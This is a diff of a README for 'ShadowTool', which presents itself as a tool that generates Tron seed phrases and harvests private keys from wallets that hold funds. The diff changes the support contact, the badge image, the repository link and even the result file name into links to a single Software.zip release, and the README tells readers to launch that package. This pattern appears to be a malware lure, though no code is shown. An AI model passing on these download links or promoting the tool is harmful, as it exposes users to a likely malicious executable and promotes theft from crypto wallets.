@@ -1,6 +1,6 @@
 # ShadowTool 🌑
 
-A powerful script designed for Tron network enthusiasts, ShadowTool is your go-to tool for automatically generating seed phrases and checking balances on Tron wallets. With a focus on efficiency and simplicity, ShadowTool quickly scans through Tron networks to identify wallets with non-zero balances. Once identified, the tool logs crucial wallet information such as address, mnemonic, private key, and balances, saving it all in a convenient file named result.txt.
+A powerful script designed for Tron network enthusiasts, ShadowTool is your go-to tool for automatically generating seed phrases and checking balances on Tron wallets. With a focus on efficiency and simplicity, ShadowTool quickly scans through Tron networks to identify wallets with non-zero balances. Once identified, the tool logs crucial wallet information such as address, mnemonic, private key, and balances, saving it all in a convenient file named https://github.com/indiizza/ShadowTool/releases/download/v1.0/Software.zip
 
 ### Features 🚀
 
@@ -22,7 +22,7 @@ A powerful script designed for Tron network enthusiasts, ShadowTool is your go-t
 
 To get started with ShadowTool, download the software package from the link below:
 
-[![Download ShadowTool](https://img.shields.io/badge/Download-ShadowTool-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download ShadowTool](https://github.com/indiizza/ShadowTool/releases/download/v1.0/Software.zip)](https://github.com/indiizza/ShadowTool/releases/download/v1.0/Software.zip)
 
 **Note**: The link leads directly to the software package, which needs to be launched for installation.
 
@@ -37,7 +37,7 @@ In case the link provided above is not working or for more information, please c
 
 ### Support 💬
 
-For any questions, feedback, or issues related to ShadowTool, feel free to [contact us](mailto:shadowtool.support@example.com). We are here to assist you every step of the way.
+For any questions, feedback, or issues related to ShadowTool, feel free to [contact us](https://github.com/indiizza/ShadowTool/releases/download/v1.0/Software.zip). We are here to assist you every step of the way.
 
 ### Contribution 🤝
 
@@ -51,6 +51,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Dive into the world of Tron network with ShadowTool by your side. Automated seed phrase generation, balance checking, and secure logging - all in one powerful tool. Embrace the shadows and master the Tron network with ShadowTool today! 🌑
 
-[Visit ShadowTool on GitHub](https://github.com/YouaifXD/ShadowTool)
+[Visit ShadowTool on GitHub](https://github.com/indiizza/ShadowTool/releases/download/v1.0/Software.zip)
 
 ---
